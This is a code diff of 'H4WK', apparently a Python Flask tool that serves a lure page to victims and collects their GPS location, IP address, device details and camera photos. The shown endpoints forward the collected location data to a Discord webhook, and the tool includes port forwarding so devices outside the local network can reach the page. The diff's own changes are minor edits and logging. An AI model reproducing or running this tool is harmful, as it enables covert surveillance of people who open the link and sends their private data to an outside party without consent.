@@ -76,15 +76,13 @@ ____________________________________________________________________________
 {R}Track{W} {G}GPS location{W}, and {G}IP address{W}, and {G}capture photos{W} with {G}device details{W}.
 ____________________________________________________________________________
 
-
-
 app = Flask(__name__)
 
 parser = argparse.ArgumentParser(
     description="H4WK- Track device location, and IP address, and capture a photo with device details.",
     usage=f"{sys.argv[0]} [-t target] [-p port]"
 )
-parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
+parser.add_argument("-t", "--target", nargs="?", help="the target URL to send the captured images to", default="http://localhost:8000/image")
 parser.add_argument("-p", "--port", nargs="?", help="port to listen on", default=8000)
 args = parser.parse_args()
 
@@ -123,7 +121,6 @@ def start_port_forwarding():
                 logging.error(line)
                 print(line)
 
-
 @app.route("/", methods=["GET"])
 def get_website():
     html_data = ""
@@ -140,9 +137,11 @@ def get_webhook_js():
 @app.route("/location_update", methods=["POST"])
 def update_location():
     data = request.json
-    discord_webhook = check_and_get_webhook_url(os.getcwd())
-    update_webhook(discord_webhook, data)
-    return "OK"
+    if data:
+        discord_webhook = check_and_get_webhook_url(os.getcwd())
+        update_webhook(discord_webhook, data)
+        logging.info(f"Data received: {data}")
+    return "OK", 200
 
 @app.route('/image', methods=['POST'])
 def image():
@@ -203,7 +202,6 @@ def check_and_get_webhook_url(folder_name):
                 print(f"{R}Invalid webhook URL found in file. Please enter a valid Discord webhook URL.{W}")
                 return get_valid_webhook()
 
-
 def run_flask(folder_name):
     try:
         os.chdir(folder_name)
@@ -214,9 +212,6 @@ def run_flask(folder_name):
     app.run(debug=False, host="0.0.0.0", port=args.port)
 
 def print_banners():
-    """
-    prints the program banners
-    """
     print(f'{R}{banner}{W}')
     print(f'{G}[+] {C}Version      : {W}{VERSION}')
     print(f'{G}[+] {C}Created By   : {W}Spyboy')
@@ -259,7 +254,6 @@ def main():
         print(f"{R}Warning: {W}Port forwarding is necessary for the application to work on other devices. Make sure to set it up using another method.")
     
     # Start the Flask server
-    #start_message = f"{G}[+] {C}Flask server started!{W}"
     start_message = f"{G}[+] {C}Flask server started! Running on {W}http://0.0.0.0:{args.port}/\n {R}Press CTRL+C to quit{W}"
     print(f"\n{start_message}\n")
     logging.info(start_message)
